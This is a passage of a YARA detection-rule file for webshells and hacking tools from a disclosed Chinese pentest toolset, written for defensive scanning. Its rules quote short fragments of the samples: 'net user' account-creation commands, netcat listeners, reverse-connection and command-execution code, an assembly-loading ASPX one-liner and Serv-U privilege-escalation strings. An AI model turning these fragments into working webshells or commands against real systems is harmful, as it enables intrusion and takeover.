     minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"newuser = \\\"-SETUSERSETUP\\\" & vbCrLf & \\\"-IP=0.0.0.0\\\" & vbCrLf & \\\"-PortNo=\\\" &\" ascii\n      $s2 = \"<td><input name=\\\"c\\\" type=\\\"text\\\" id=\\\"c\\\" value=\\\"cmd /c net user goldsun lov\" ascii\n      $s3 = \"deldomain = \\\"-DELETEDOMAIN\\\" & vbCrLf & \\\"-IP=0.0.0.0\\\" & vbCrLf & \\\" PortNo=\\\"\" ascii\n   condition: \n      filesize < 30KB and 2 of them\n}\n\nrule CN_Honker_Webshell_cfm_list_RID31AD : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file list.cfm\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:32:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<TD><a href=\\\"javascript:ShowFile('#mydirectory.name#')\\\">#mydirectory.name#</a>\" ascii\n      $s2 = \"<TD>#mydirectory.size#</TD>\" fullword ascii\n   condition: \n      filesize < 10KB and all of them\n}\n\nrule CN_Honker_Webshell_PHP_php2_RID311D : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php2.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:08:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$OOO0O0O00=__FILE__;$OOO000000=urldecode('\" ascii\n      $s2 = \"<?php // Black\" fullword ascii\n   condition: \n      filesize < 12KB and all of them\n}\n\nrule CN_Honker_Webshell_Tuoku_script_oracle_RID363D : CHINA DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file oracle.jsp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:47:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"String url=\\\"jdbc:oracle:thin:@localhost:1521:orcl\\\";\" fullword ascii\n      $s2 = \"String user=\\\"oracle_admin\\\";\" fullword ascii\n      $s3 = \"String sql=\\\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\\\";\" fullword ascii\n   condition: \n      filesize < 7KB and all of them\n}\n\nrule CN_Honker_Webshell_ASPX_aspx4_RID31E7 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file aspx4.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:42:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"File.Delete(cdir.FullName + \\\"\\\\\\\\test\\\");\" fullword ascii\n      $s5 = \"start<asp:TextBox ID=\\\"Fport_TextBox\\\" runat=\\\"server\\\" Text=\\\"c:\\\\\\\" Width=\\\"60\" ascii\n      $s6 = \"<div>Code By <a href =\\\"http://www.hkmjj.com\\\">Www.hkmjj.Com</a></div>\" fullword ascii\n   condition: \n      filesize < 11KB and all of them\n}\n\nrule CN_Honker_Webshell_ASPX_aspx_RID31B3 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file aspx.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:33:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"string iVDT=\\\"-SETUSERSETUP\\\\r\\\\n-IP=0.0.0.0\\\\r\\\\n-PortNo=52521\\\\r\\\\n-User=bin\" ascii\n      $s1 = \"SQLExec : <asp:DropDownList runat=\\\"server\\\" ID=\\\"FGEy\\\" AutoPostBack=\\\"True\\\" O\" ascii\n      $s2 = \"td.Text=\\\"<a href=\\\\\\\"javascript:Bin_PostBack('urJG','\\\"+dt.Rows[j][\\\"ProcessID\" ascii\n      $s3 = \"vyX.Text+=\\\"<a href=\\\\\\\"javascript:Bin_PostBack('Bin_Regread','\\\"+MVVJ(rootkey)+\" ascii\n   condition: \n      filesize < 353KB and 2 of them\n}\n\nrule CN_Honker_Webshell_su7_x_9_x_RID31C1 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file su7.x-9.x.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:36:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"returns=httpopen(\\\"LoginID=\\\"&user&\\\"&FullName=&Password=\\\"&pass&\\\"&ComboPasswor\" ascii\n      $s1 = \"returns=httpopen(\\\"\\\",\\\"POST\\\",\\\"http://127.0.0.1:\\\"&port&\\\"/Admin/XML/User.xml?\" ascii\n   condition: \n      filesize < 59KB and all of them\n}\n\nrule CN_Honker_Webshell_cfmShell_RID318A : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file cfmShell.cfm\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:26:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<cfexecute name=\\\"C:\\\\Winnt\\\\System32\\\\cmd.exe\\\"\" fullword ascii\n      $s4 = \"<cfif FileExists(\\\"#GetTempDirectory()#foobar.txt\\\") is \\\"Yes\\\">\" fullword ascii\n   condition: \n      filesize < 4KB and all of them\n}\n\nrule CN_Honker_Webshell_ASP_asp4_RID3117 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file asp4.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:07:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"if ShellPath=\\\"\\\" Then ShellPath = \\\"cmd.exe\\\"\" fullword ascii\n      $s6 = \"Response.Cookies(Cookie_Login) = sPwd\" fullword ascii\n      $s8 = \"Set DD=CM.exec(ShellPath&\\\" /c \\\"&DefCmd)\" fullword ascii\n   condition: \n      filesize < 150KB and all of them\n}\n\nrule CN_Honker_Webshell_Serv_U_2_admin_by_lake2_RID3711 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file Serv-U 2 admin by lake2.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 17:22:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"xPost3.Open \\\"POST\\\", \\\"http://127.0.0.1:\\\"& port &\\\"/lake2\\\", True\" fullword ascii\n      $s2 = \"response.write \\\"FTP user lake  pass admin123 :)<br><BR>\\\"\" fullword ascii\n      $s8 = \"<p>Serv-U Local Get SYSTEM Shell with ASP\" fullword ascii\n      $s9 = \"\\\"-HomeDir=c:\\\\\\\\\\\" & vbcrlf & \\\"-LoginMesFile=\\\" & vbcrlf & \\\"-Disable=0\\\" & vb\" ascii\n   condition: \n      filesize < 17KB and 2 of them\n}\n\nrule CN_Honker_Webshell_PHP_php3_RID311E : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php3.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:08:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"} elseif(@is_resource($f = @popen($cfe,\\\"r\\\"))) {\" fullword ascii\n      $s2 = \"cf('/tmp/.bc',$back_connect);\" fullword ascii\n   condition: \n      filesize < 8KB and all of them\n}\n\nrule CN_Honker_Webshell_Serv_U_by_Goldsun_RID3525 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file Serv-U_by_Goldsun.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:00:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"b.open \\\"GET\\\", \\\"http://127.0.0.1:\\\" & ftpport & \\\"/goldsun/upadmin/s2\\\", True,\" ascii\n      $s2 = \"newuser = \\\"-SETUSERSETUP\\\" & vbCrLf & \\\"-IP=0.0.0.0\\\" & vbCrLf & \\\"-PortNo=\\\" &\" ascii\n      $s3 = \"127.0.0.1:<%=port%>,\" fullword ascii\n      $s4 = \"GName=\\\"http://\\\" & request.servervariables(\\\"server_name\\\")&\\\":\\\"&request.serve\" ascii\n   condition: \n      filesize < 30KB and 2 of them\n}\n\nrule CN_Honker_Webshell_PHP_php10_RID314C : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php10.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:16:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dumpTable($N,$M,$Hc=false){if($_POST[\\\"format\\\"]!=\\\"sql\\\"){echo\\\"\\\\xef\\\\xbb\\\\xbf\" ascii\n      $s2 = \"';if(DB==\\\"\\\"||!$od){echo\\\"<a href='\\\".h(ME).\\\"sql='\\\".bold(isset($_GET[\\\"sql\\\"]\" ascii\n   condition: \n      filesize < 600KB and all of them\n}\n\nrule CN_Honker_Webshell_Serv_U_servu_RID3344 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file servu.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:40:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"fputs ($conn_id, \\\"SITE EXEC \\\".$dir.\\\"cmd.exe /c \\\".$cmd.\\\"\\\\r\\\\n\\\");\" fullword ascii\n      $s1 = \"function ftpcmd($ftpport,$user,$password,$dir,$cmd){\" fullword ascii\n   condition: \n      filesize < 41KB and all of them\n}\n\nrule CN_Honker_Webshell_portRecall_jsp2_RID3452 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jsp2.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:25:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"final String remoteIP =request.getParameter(\\\"remoteIP\\\");\" fullword ascii\n      $s4 = \"final String localIP = request.getParameter(\\\"localIP\\\");\" fullword ascii\n      $s20 = \"final String localPort = \\\"3390\\\";//request.getParameter(\\\"localPort\\\");\" fullword ascii\n   condition: \n      filesize < 23KB and all of them\n}\n\nrule CN_Honker_Webshell_ASPX_aspx2_RID31E5 : CHINA DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file aspx2.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:42:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if (password.Equals(this.txtPass.Text))\" fullword ascii\n      $s1 = \"<head runat=\\\"server\\\">\" fullword ascii\n      $s2 = \":<asp:TextBox runat=\\\"server\\\" ID=\\\"txtPass\\\" Width=\\\"400px\\\"></asp:TextBox>\" fullword ascii\n      $s3 = \"this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\\\"PATH_INFO\\\"]);\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 9KB and all of them\n}\n\nrule CN_Honker_Webshell_ASP_hy2006a_RID31A9 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file hy2006a.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:32:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s15 = \"Const myCmdDotExeFile = \\\"command.com\\\"\" fullword ascii\n      $s16 = \"If LCase(appName) = \\\"cmd.exe\\\" And appArgs <> \\\"\\\" Then\" fullword ascii\n   condition: \n      filesize < 406KB and all of them\n}\n\nrule CN_Honker_mempodipper2_6_RID3030 : CHINA DEMO HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file mempodipper2.6.39\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:29:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed\" ascii\n   condition: \n      filesize < 30KB and all of them\n}\n\nrule CN_Honker_Arp_EMP_v1_0_RID2EC0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Arp EMP v1.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:27:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Arp EMP v1.0.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule CN_Honker_Webshell_PHP_php1_RID311C : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php1.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:08:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"$sendbuf = \\\"site exec \\\".$_POST[\\\"SUCommand\\\"].\\\"\\\\r\\\\n\\\";\" fullword ascii\n      $s8 = \"elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_c\" ascii\n      $s18 = \"echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport\" ascii\n   condition: \n      filesize < 621KB and all of them\n}\n\nrule CN_Honker_Webshell_jspshell2_RID31F3 : CHINA DEMO T1007 T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jspshell2.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:44:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1007, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s10 = \"if (cmd == null) cmd = \\\"cmd.exe /c set\\\";\" fullword ascii\n      $s11 = \"if (program == null) program = \\\"cmd.exe /c net start > \\\"+SHELL_DIR+\\\"/Log.txt\" ascii\n   condition: \n      filesize < 424KB and all of them\n}\n\nrule CN_Honker_Webshell_Tuoku_script_mysql_RID35FD : CHINA DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file mysql.aspx\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"txtpassword.Attributes.Add(\\\"onkeydown\\\", \\\"SubmitKeyClick('btnLogin');\\\");\" fullword ascii\n      $s2 = \"connString = string.Format(\\\"Host = {0}; UserName = {1}; Password = {2}; Databas\" ascii\n   condition: \n      filesize < 202KB and all of them\n}\n\nrule CN_Honker_Webshell_PHP_php9_RID3124 : CHINA DEMO T1087_002 T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php9.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:09:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1087_002, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Str[17] = \\\"select shell('c:\\\\windows\\\\system32\\\\cmd.exe /c net user b4che10r ab\" ascii\n   condition: \n      filesize < 1087KB and all of them\n}\n\nrule CN_Honker_Webshell_portRecall_jsp_RID3420 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:17:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"lcx.jsp?localIP=202.91.246.59&localPort=88&remoteIP=218.232.111.187&remotePort=2\" ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule CN_Honker_Webshell_ASPX_aspx3_RID31E6 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file aspx3.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:42:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Process p1 = Process.Start(\\\"\\\\\\\"\\\" + txtRarPath.Value + \\\"\\\\\\\"\\\", \\\" a -y -k -m\" ascii\n      $s12 = \"if (_Debug) System.Console.WriteLine(\\\"\\\\ninserting filename into CDS:\" ascii\n   condition: \n      filesize < 100KB and all of them\n}\n\nrule CN_Honker_Webshell_ASPX_shell_shell_RID3486 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file shell.aspx\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:34:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cook\" ascii\n      $s1 = \"<%@ Page Language=\\\"C#\\\" ValidateRequest=\\\"false\\\" %>\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule CN_Honker_Webshell__php1_php7_php9_RID33F2 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:09:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"05a3f93dbb6c3705fd5151b6ffb64b53bc555575\"\n      hash2 = \"cd3962b1dba9f1b389212e38857568b69ca76725\"\n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<a href=\\\"?s=h&o=wscript\\\">[WScript.shell]</a> \" fullword ascii\n      $s2 = \"document.getElementById('cmd').value = Str[i];\" fullword ascii\n      $s3 = \"Str[7] = \\\"copy c:\\\\\\\\\\\\\\\\1.php d:\\\\\\\\\\\\\\\\2.php\\\";\" fullword ascii\n   condition: \n      filesize < 300KB and all of them\n}\n\nrule CN_Honker_Webshell__Serv_U_by_Goldsun_asp3_Serv_U_asp_RID3BB0 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - from files Serv-U_by_Goldsun.asp, asp3.txt, Serv-U asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 20:39:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"87c5a76989bf08da5562e0b75c196dcb3087a27b\"\n      hash2 = \"cee91cd462a459d31a95ac08fe80c70d2f9c1611\"\n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c.send loginuser & loginpass & mt & deldomain & quit\" fullword ascii\n      $s2 = \"loginpass = \\\"Pass \\\" & pass & vbCrLf\" fullword ascii\n      $s3 = \"b.send \\\"User go\\\" & vbCrLf & \\\"pass od\\\" & vbCrLf & \\\"site exec \\\" & cmd & vbCr\" ascii\n   condition: \n      filesize < 444KB and all of them\n}\n\nrule CN_Honker_Webshell__asp4_asp4_MSSQL__MSSQL__RID36A6 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - from files asp4.txt, asp4.txt, MSSQL_.asp, MSSQL_.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 17:04:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash2 = \"7097c21f92306983add3b5b29a517204cd6cd819\"\n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\"<form name=\\\"\\\"searchfileform\\\"\\\" action=\\\"\\\"?action=searchfile\\\"\\\" method=\\\"\" ascii\n      $s1 = \"\\\"<TD ALIGN=\\\"\\\"Left\\\"\\\" colspan=\\\"\\\"5\\\"\\\">[\\\"& DbName & \\\"]\" fullword ascii\n      $s2 = \"Set Conn = Nothing \" fullword ascii\n   condition: \n      filesize < 341KB and all of them\n}\n\nrule CN_Honker_Webshell__Injection_jmCook_jmPost_ManualInjection_RID3E5C : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - from files Injection.exe, jmCook.asp, jmPost.asp, ManualInjection.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 22:33:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5e1851c77ce922e682333a3cb83b8506e1d7395d\"\n      hash2 = \"f80ec26bbdc803786925e8e0450ad7146b2478ff\"\n      hash3 = \"e83d427f44783088a84e9c231c6816c214434526\"\n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"response.write  PostData(JMUrl,JmStr,JmCok,JmRef)\" fullword ascii\n      $s2 = \"strReturn=Replace(strReturn,chr(43),\\\"%2B\\\")  'JMDCW\" fullword ascii\n   condition: \n      filesize < 7342KB and all of them\n}\n\nrule CN_Honker_Webshell_cmfshell_RID31AA : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file cmfshell.cmf\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:32:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<cfexecute name=\\\"C:\\\\Winnt\\\\System32\\\\cmd.exe\\\"\" fullword ascii\n      $s2 = \"<form action=\\\"<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>\\\" method=\\\"post\\\">\" fullword ascii\n   condition: \n      filesize < 4KB and all of them\n}\n\nrule CN_Honker_Webshell_PHP_php4_RID311F : CHINA DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php4.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:09:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"nc -l -vv -p port(\" ascii\n   condition: \n      uint16 ( 0 ) == 0x4850 and filesize < 1KB and all of them\n}\n\nrule CN_Honker_Webshell_Linux_2_6_Exploit_RID34D6 : CHINA DEMO EXPLOIT LINUX T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file 2.6.9\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:47:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXPLOIT, LINUX, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?\" fullword ascii\n   condition: \n      filesize < 56KB and all of them\n}\n\nrule CN_Honker_Webshell_ASP_asp2_RID3115 : CHINA DEMO 